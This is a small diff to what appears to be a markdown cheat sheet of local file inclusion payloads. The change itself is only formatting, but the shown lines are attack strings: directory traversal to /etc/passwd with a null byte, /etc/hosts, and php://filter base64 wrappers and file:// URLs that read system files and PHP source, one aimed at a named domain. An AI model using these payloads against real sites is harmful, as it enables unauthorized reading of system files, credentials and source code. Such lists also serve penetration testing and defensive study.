@@ -399,9 +399,8 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 ../../../../../../../../../../../etc/passwd%00 ;(etc/rc, etc/rc.local, etc/ssh/ssh_config)
 ../../../../../../../../../../../etc/hosts ;(proc/cpuinfo, proc/meminfo)
 
-```
-**php wrappers:**
-```
+*php wrappers:*
+
 index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 page=php://filter/convert.base64-encode/resource=index.php
 page=file:///hidden_code.txt
